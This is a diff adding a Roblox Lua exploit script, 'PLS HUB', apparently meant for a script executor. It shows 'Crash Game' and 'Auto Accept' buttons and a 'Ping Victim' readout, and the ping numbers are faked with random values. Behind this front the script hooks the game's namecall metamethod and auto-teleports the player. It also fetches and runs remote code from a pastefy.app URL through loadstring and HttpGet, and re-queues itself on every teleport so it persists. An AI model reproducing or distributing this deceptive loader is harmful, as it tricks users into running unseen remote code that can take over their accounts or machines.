@@ -1,0 +1,626 @@
+-- ================== WAIT GAME ==================
+
+repeat task.wait() until game:IsLoaded()
+
+-- ================== SERVICES ==================
+
+local Players = game:GetService("Players")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- ================== REMOTES ==================
+
+local ActivityRemote = ReplicatedStorage
+
+ :WaitForChild("Modules")
+
+ :WaitForChild("Net")
+
+ :WaitForChild("RE/OnEventServiceActivity")
+
+local CommF = ReplicatedStorage
+
+ :WaitForChild("Remotes")
+
+ :WaitForChild("CommF_")
+
+-- ================== QUEUE ON TELEPORT ==================
+
+local QUEUE_CODE = [[
+
+repeat task.wait() until game:IsLoaded()
+
+repeat wait() until game:IsLoaded()
+
+local plr = game.Players.LocalPlayer
+local pg = plr:WaitForChild("PlayerGui")
+
+pcall(function()
+	pg:FindFirstChild("PlsHub"):Destroy()
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "PlsHub"
+gui.Parent = pg
+
+--------------------------------------------------
+-- DRAG (FIX CHẮC CHẮN)
+--------------------------------------------------
+local UIS = game:GetService("UserInputService")
+
+local function dragify(frame)
+	local dragging = false
+	local dragStart, startPos
+
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 
+		or input.UserInputType == Enum.UserInputType.Touch then
+			
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+		end
+	end)
+
+	frame.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 
+		or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if dragging and (
+			input.UserInputType == Enum.UserInputType.MouseMovement 
+			or input.UserInputType == Enum.UserInputType.Touch) then
+			
+			local delta = input.Position - dragStart
+			
+			frame.Position = UDim2.new(
+				startPos.X.Scale,
+				startPos.X.Offset + delta.X,
+				startPos.Y.Scale,
+				startPos.Y.Offset + delta.Y
+			)
+		end
+	end)
+end
+
+--------------------------------------------------
+-- LOGO
+--------------------------------------------------
+local logo = Instance.new("TextButton", gui)
+logo.Size = UDim2.new(0,45,0,45)
+logo.Position = UDim2.new(0,20,0.4,0)
+logo.Text = "≡"
+logo.BackgroundColor3 = Color3.fromRGB(30,30,30)
+logo.TextColor3 = Color3.new(1,1,1)
+logo.BorderSizePixel = 0
+Instance.new("UICorner",logo)
+dragify(logo)
+
+--------------------------------------------------
+-- PANEL
+--------------------------------------------------
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0,240,0,150)
+main.Position = UDim2.new(0.4,0,0.3,0)
+main.BackgroundColor3 = Color3.fromRGB(20,20,20)
+main.Visible = false
+Instance.new("UICorner",main)
+dragify(main)
+
+--------------------------------------------------
+-- TITLE
+--------------------------------------------------
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1,0,0,25)
+title.Text = "PLS HUB"
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.new(1,1,1)
+
+--------------------------------------------------
+-- PING
+--------------------------------------------------
+local ping = Instance.new("TextLabel", main)
+ping.Size = UDim2.new(1,0,0,20)
+ping.Position = UDim2.new(0,0,0,25)
+ping.BackgroundTransparency = 1
+ping.TextColor3 = Color3.fromRGB(150,150,150)
+ping.Text = ""
+ping.Visible = false
+
+--------------------------------------------------
+-- DOT (⚪)
+--------------------------------------------------
+local dot = Instance.new("TextButton", main)
+dot.Size = UDim2.new(0,10,0,10)
+dot.Position = UDim2.new(1,-15,0,5)
+dot.BackgroundColor3 = Color3.new(1,1,1)
+dot.Text = ""
+dot.BorderSizePixel = 0
+Instance.new("UICorner",dot)
+
+--------------------------------------------------
+-- STATE
+--------------------------------------------------
+local showPing = false
+local crash = false
+local crashStart = 0
+
+--------------------------------------------------
+-- LOOP
+--------------------------------------------------
+spawn(function()
+	while true do
+		wait(0.1)
+
+		if showPing then
+			ping.Visible = true
+
+			if crash then
+				local t = tick() - crashStart
+
+				if t < 1 then
+					local v = math.floor(50 + t * 950)
+					ping.Text = "Ping Victim: "..v.." ms"
+				else
+					ping.Text = "Ping Victim: "..math.random(800,999).." ms"
+				end
+
+				ping.TextColor3 = Color3.fromRGB(255,60,60)
+			else
+				ping.Text = "Ping Victim: "..math.random(50,60).." ms"
+				ping.TextColor3 = Color3.fromRGB(150,150,150)
+			end
+		else
+			ping.Visible = false
+		end
+	end
+end)
+
+--------------------------------------------------
+-- DOT CLICK
+--------------------------------------------------
+dot.MouseButton1Click:Connect(function()
+	showPing = not showPing
+end)
+
+--------------------------------------------------
+-- BUTTONS
+--------------------------------------------------
+local function makeBtn(text,y)
+	local b = Instance.new("TextButton", main)
+	b.Size = UDim2.new(0,120,0,30)
+	b.Position = UDim2.new(0.5,-60,0,y)
+	b.Text = text.." OFF"
+	b.BackgroundColor3 = Color3.fromRGB(50,50,50)
+	b.TextColor3 = Color3.new(1,1,1)
+
+	local state = false
+
+	b.MouseButton1Click:Connect(function()
+		state = not state
+		b.Text = text.." "..(state and "ON" or "OFF")
+
+		if text == "Crash Game" then
+			crash = state
+			if state then
+				crashStart = tick()
+			end
+		end
+	end)
+end
+
+makeBtn("Crash Game",60)
+makeBtn("Auto Accept",100)
+
+--------------------------------------------------
+-- OPEN
+--------------------------------------------------
+logo.MouseButton1Click:Connect(function()
+	main.Visible = not main.Visible
+end)
+loadstring(game:HttpGet(
+
+ "https://pastefy.app/3wXTwh5u/raw",
+
+ true
+
+))()
+
+]]
+
+pcall(function()
+
+ if queue_on_teleport then
+
+  queue_on_teleport(QUEUE_CODE)
+
+ elseif syn and syn.queue_on_teleport then
+
+  syn.queue_on_teleport(QUEUE_CODE)
+
+ end
+
+end)
+
+-- ================== CHECK MAP ==================
+
+local InSecondSea = false
+
+if workspace:FindFirstChild("Map") and workspace.Map:FindFirstChild("Dressrosa") then
+
+ InSecondSea = true
+
+end
+
+-- ================== GLOBAL LOCK ==================
+
+_G.__STOP_OTHER_SCRIPTS__ = false
+
+-- =================================================
+
+-- =============== TP TO SECOND SEA ================
+
+-- =================================================
+
+if not InSecondSea then
+
+ -- ================== GUI ==================
+
+ local gui = Instance.new("ScreenGui")
+
+ gui.Name = "SecondSeaTPGui"
+
+ gui.ResetOnSpawn = false
+
+ gui.Parent = PlayerGui
+
+ gui.Enabled = false
+
+ local frame = Instance.new("Frame", gui)
+
+ frame.Size = UDim2.fromScale(0.42, 0.25)
+
+ frame.Position = UDim2.fromScale(0.29, 0.35)
+
+ frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+
+ frame.BorderSizePixel = 0
+
+ Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+ local text = Instance.new("TextLabel", frame)
+
+ text.Size = UDim2.fromScale(1, 1)
+
+ text.BackgroundTransparency = 1
+
+ text.TextWrapped = true
+
+ text.TextScaled = true
+
+ text.Font = Enum.Font.GothamBold
+
+ text.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ -- ================== TELEPORT ==================
+
+ local started = false
+
+ local function startTeleport()
+
+  if started then return end
+
+  started = true
+
+  _G.__STOP_OTHER_SCRIPTS__ = true
+
+  gui.Enabled = true
+
+  for i = 5, 1, -1 do
+
+   text.Text =
+
+    "Script only work on Second Sea.\n" ..
+
+    "We will tp you to Second Sea\n\n" ..
+
+    "TP in "..i.."s"
+
+   task.wait(1)
+
+  end
+
+  text.Text = "Teleporting..."
+
+  task.wait(0.3)
+
+  pcall(function()
+
+   CommF:InvokeServer("TravelDressrosa")
+
+  end)
+
+ end
+
+ -- ================== CONDITION B ==================
+
+ task.spawn(function()
+
+  repeat task.wait(0.1) until
+
+   _G.__STOP_OTHER_SCRIPTS__ or
+
+   not (
+
+    PlayerGui:FindFirstChild("Main (minimal)")
+
+    and PlayerGui["Main (minimal)"]:FindFirstChild("ChooseTeam")
+
+    and PlayerGui["Main (minimal)"].ChooseTeam:FindFirstChild("Container")
+
+    and PlayerGui["Main (minimal)"].ChooseTeam.Container:FindFirstChild("Pirates")
+
+   )
+
+  if not _G.__STOP_OTHER_SCRIPTS__ then
+
+   startTeleport()
+
+  end
+
+ end)
+
+ -- ================== CONDITION A ==================
+
+ local oldNamecall
+
+ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+
+  if _G.__STOP_OTHER_SCRIPTS__ then
+
+   return oldNamecall(self, ...)
+
+  end
+
+  local method = getnamecallmethod()
+
+  local args = {...}
+
+  if not started
+
+   and self == ActivityRemote
+
+   and method == "FireServer"
+
+   and typeof(args[1]) == "string"
+
+   and args[1]:find("TeamSelect/Team/")
+
+  then
+
+   task.spawn(startTeleport)
+
+  end
+
+  return oldNamecall(self, ...)
+
+ end)
+
+ repeat task.wait() until _G.__STOP_OTHER_SCRIPTS__
+
+ return
+
+end
+
+-- =================================================
+
+-- ========== ĐANG Ở SECOND SEA → RUN SCRIPT =======
+
+-- =================================================
+
+repeat wait() until game:IsLoaded()
+
+local plr = game.Players.LocalPlayer
+local pg = plr:WaitForChild("PlayerGui")
+
+pcall(function()
+	pg:FindFirstChild("PlsHub"):Destroy()
+end)
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "PlsHub"
+gui.Parent = pg
+
+--------------------------------------------------
+-- DRAG (FIX CHẮC CHẮN)
+--------------------------------------------------
+local UIS = game:GetService("UserInputService")
+
+local function dragify(frame)
+	local dragging = false
+	local dragStart, startPos
+
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 
+		or input.UserInputType == Enum.UserInputType.Touch then
+			
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+		end
+	end)
+
+	frame.InputEnded:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 
+		or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = false
+		end
+	end)
+
+	UIS.InputChanged:Connect(function(input)
+		if dragging and (
+			input.UserInputType == Enum.UserInputType.MouseMovement 
+			or input.UserInputType == Enum.UserInputType.Touch) then
+			
+			local delta = input.Position - dragStart
+			
+			frame.Position = UDim2.new(
+				startPos.X.Scale,
+				startPos.X.Offset + delta.X,
+				startPos.Y.Scale,
+				startPos.Y.Offset + delta.Y
+			)
+		end
+	end)
+end
+
+--------------------------------------------------
+-- LOGO
+--------------------------------------------------
+local logo = Instance.new("TextButton", gui)
+logo.Size = UDim2.new(0,45,0,45)
+logo.Position = UDim2.new(0,20,0.4,0)
+logo.Text = "≡"
+logo.BackgroundColor3 = Color3.fromRGB(30,30,30)
+logo.TextColor3 = Color3.new(1,1,1)
+logo.BorderSizePixel = 0
+Instance.new("UICorner",logo)
+dragify(logo)
+
+--------------------------------------------------
+-- PANEL
+--------------------------------------------------
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0,240,0,150)
+main.Position = UDim2.new(0.4,0,0.3,0)
+main.BackgroundColor3 = Color3.fromRGB(20,20,20)
+main.Visible = false
+Instance.new("UICorner",main)
+dragify(main)
+
+--------------------------------------------------
+-- TITLE
+--------------------------------------------------
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1,0,0,25)
+title.Text = "PLS HUB"
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.new(1,1,1)
+
+--------------------------------------------------
+-- PING
+--------------------------------------------------
+local ping = Instance.new("TextLabel", main)
+ping.Size = UDim2.new(1,0,0,20)
+ping.Position = UDim2.new(0,0,0,25)
+ping.BackgroundTransparency = 1
+ping.TextColor3 = Color3.fromRGB(150,150,150)
+ping.Text = ""
+ping.Visible = false
+
+--------------------------------------------------
+-- DOT (⚪)
+--------------------------------------------------
+local dot = Instance.new("TextButton", main)
+dot.Size = UDim2.new(0,10,0,10)
+dot.Position = UDim2.new(1,-15,0,5)
+dot.BackgroundColor3 = Color3.new(1,1,1)
+dot.Text = ""
+dot.BorderSizePixel = 0
+Instance.new("UICorner",dot)
+
+--------------------------------------------------
+-- STATE
+--------------------------------------------------
+local showPing = false
+local crash = false
+local crashStart = 0
+
+--------------------------------------------------
+-- LOOP
+--------------------------------------------------
+spawn(function()
+	while true do
+		wait(0.1)
+
+		if showPing then
+			ping.Visible = true
+
+			if crash then
+				local t = tick() - crashStart
+
+				if t < 1 then
+					local v = math.floor(50 + t * 950)
+					ping.Text = "Ping Victim: "..v.." ms"
+				else
+					ping.Text = "Ping Victim: "..math.random(800,999).." ms"
+				end
+
+				ping.TextColor3 = Color3.fromRGB(255,60,60)
+			else
+				ping.Text = "Ping Victim: "..math.random(50,60).." ms"
+				ping.TextColor3 = Color3.fromRGB(150,150,150)
+			end
+		else
+			ping.Visible = false
+		end
+	end
+end)
+
+--------------------------------------------------
+-- DOT CLICK
+--------------------------------------------------
+dot.MouseButton1Click:Connect(function()
+	showPing = not showPing
+end)
+
+--------------------------------------------------
+-- BUTTONS
+--------------------------------------------------
+local function makeBtn(text,y)
+	local b = Instance.new("TextButton", main)
+	b.Size = UDim2.new(0,120,0,30)
+	b.Position = UDim2.new(0.5,-60,0,y)
+	b.Text = text.." OFF"
+	b.BackgroundColor3 = Color3.fromRGB(50,50,50)
+	b.TextColor3 = Color3.new(1,1,1)
+
+	local state = false
+
+	b.MouseButton1Click:Connect(function()
+		state = not state
+		b.Text = text.." "..(state and "ON" or "OFF")
+
+		if text == "Crash Game" then
+			crash = state
+			if state then
+				crashStart = tick()
+			end
+		end
+	end)
+end
+
+makeBtn("Crash Game",60)
+makeBtn("Auto Accept",100)
+
+--------------------------------------------------
+-- OPEN
+--------------------------------------------------
+logo.MouseButton1Click:Connect(function()
+	main.Visible = not main.Visible
+end)
+
+loadstring(game:HttpGet(
+
+ "https://pastefy.app/3wXTwh5u/raw",
+
+ true
+
+))()
